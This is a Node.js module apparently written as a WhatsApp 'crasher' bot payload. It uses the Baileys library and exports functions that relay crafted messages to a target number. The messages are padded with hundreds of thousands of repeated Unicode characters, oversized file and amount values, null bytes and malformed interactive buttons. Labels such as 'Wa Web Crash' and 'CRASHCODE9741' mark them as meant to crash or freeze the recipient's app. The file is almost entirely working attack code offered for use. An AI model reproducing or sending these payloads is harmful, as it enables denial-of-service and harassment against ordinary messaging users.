const {
  proto,
  generateWAMessageFromContent,
  generateMessageID,
  prepareWAMessageMedia,
} = require("../../baileys");
const fs = require("fs");
const crypto = require("crypto");
const woi = fs.readFileSync("./src/woi.jpg");

async function waweb(sock, jid, mess) {
  const listMessage = {
    templateMessage: {
      hydratedTemplate: {
        hydratedContentText: mess,
        hydratedButtons: [
          {
            buttonText: "Wa Web Crash",
            listButton: {
              title: "Crot",
              description: "ADJI DJI",
              sections: [
                {
                  title: "DJIDJO",
                  rows: [
                    { title: "123", description: "123", id: "1" },
                    { title: "123", description: "123", id: "1" },
                  ],
                },
              ],
            },
          },
        ],
      },
    },
  };

  const message = generateWAMessageFromContent(
    jid,
    proto.Message.fromObject(listMessage),
    { userJid: jid }
  );
  await sock.relayMessage(jid, message.message, { messageId: message.key.id });
}

async function CrlButton(isTarget, sock, m) {
  const VcardQuoted = {
    key: {
      fromMe: false,
      participant: `0@s.whatsapp.net`,
      ...(m.sender
        ? {
            remoteJid: "0@s.whatsapp.net",
          }
        : {}),
    },
    message: {
      documentMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype:
          "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "974197419741",
        pageCount: "974197419741",
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: "𝐓𝐚𝐦𝐚𝐂𝐫𝐚𝐬𝐡~𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭 :v",
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath:
          "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1715880173",
        contactVcard: true,
      },
      title: "Haha Bot" + "ꦾ".repeat(103000),
      body: {
        text: "TamaRiyuchi" + "ꦾ".repeat(103000) + "@1".repeat(150000),
      },
      nativeFlowMessage: {},
      contextInfo: {
        mentionedJid: ["1@newsletter"],
        groupMentions: [
          { groupJid: "1@newsletter", groupSubject: "TAMARYUICHI" },
        ],
      },
    },
    contextInfo: {
      mentionedJid: [m.chat],
      externalAdReply: {
        showAdAttribution: true,
        title: "Cella ",
        body: "Cella Always With You",
        mediaType: 3,
        renderLargerThumbnail: true,
        thumbnailUrl: "your-thumbnail-url-here",
        sourceUrl: "https://youtube.com/@Cella",
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "12036332170343299@newsletter",
        serverMessageId: 1,
        newsletterName: "Cella Crasher",
      },
    },
    expiryTimestamp: 0,
    amount: {
      value: "999999999",
      offset: 999999999,
      currencyCode: "CRASHCODE9741",
    },
    background: {
      id: "100",
      fileLength: "928283",
      width: 1000,
      height: 1000,
      mimetype: "application/vnd.ms-powerpoint",
      placeholderArgb: 4278190080,
      textArgb: 4294967295,
      subtextArgb: 4278190080,
    },
  };

  const msg = generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `\0`,
            },
            carouselMessage: {
              cards: [
                {
                  header: {
                    ...(await prepareWAMessageMedia(
                      { image: { url: "https://png.pngtree.com/thumb_back/fw800/background/20230527/pngtree-image-of-grim-reaper-hd-pictures-image_2683510.jpg" } },
                      { upload: sock.waUploadToServer }
                    )),
                    title: `\0`,
                    gifPlayback: true,
                    subtitle: "\0",
                    hasMediaAttachment: true,
                  },
                  body: {
                    text: `TEST` + "ꦾ".repeat(95000),
                  },
                  footer: {
                    text: "\0",
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "😂۞𝐓͢𝐚𝐦𝐚ܢ𝐎𝐯𝐞𝐫𝐅𝐥𝐨⃕𝐰⃟😂",
                          sections: [],
                        }),
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: `{"title":"${"𑲭".repeat(
                          90000
                        )}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`,
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson:
                          '{"title":"🦠","sections":[{"title":"🔥","highlight_label":"💥","rows":[{"header":"","title":"💧","id":"⚡"},{"header":"","title":"💣","id":"✨"}]}]}',
                      },
                      {
                        name: "quick_reply",
                        buttonParamsJson:
                          '{"display_text":"Quick Crash Reply","id":"📌"}',
                      },
                      {
                        name: "cta_url",
                        buttonParamsJson:
                          '{"display_text":"Developed","url":"https://www.youtube.com/@Cella","merchant_url":"https://www.youtube.com/@Cella"}',
                      },
                      {
                        name: "cta_call",
                        buttonParamsJson: JSON.stringify({
                          display_text: "amba",
                          id: "13135550002",
                        }),
                      },
                      {
                        name: "cta_copy",
                        buttonParamsJson:
                          '{"display_text":"Copy Crash Code","id":"message","copy_code":"#CRASHCODE9741"}',
                      },
                      {
                        name: "cta_reminder",
                        buttonParamsJson:
                          '{"display_text":"Set Reminder Crash","id":"message"}',
                      },
                      {
                        name: "cta_cancel_reminder",
                        buttonParamsJson:
                          '{"display_text":"Cancel Reminder Crash","id":"message"}',
                      },
                      {
                        name: "address_message",
                        buttonParamsJson:
                          '{"display_text":"Send Crash Address","id":"message"}',
                      },
                      {
                        name: "send_location",
                        buttonParamsJson: "\0",
                      },
                    ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: VcardQuoted }
  );
  await sock.relayMessage(isTarget, msg.message, {
    messageId: msg.key.id,
  });
  console.log("Success! Crl Button Sent");
}

async function out(isTarget, sock) {
  let Msg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: isTarget,
            },
          },
          body: {
            text: "assalamualaikum",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ᬻ".repeat(999999),
                  id: "p",
                }),
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(isTarget, Msg, {
    participant: { jid: isTarget },
  });
}

const Catalog = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
  },
  message: {
    orderMessage: {
      orderId: "999999999999",
      thumbnail: null,
      itemCount: 999999999999,
      status: "INQUIRY",
      surface: "CATALOG",
      message: "wak",
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==",
    },
  },
  contextInfo: {
    mentionedJid: ["27746135260@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  },
};

module.exports = {
  waweb,
  out,
  CrlButton
};
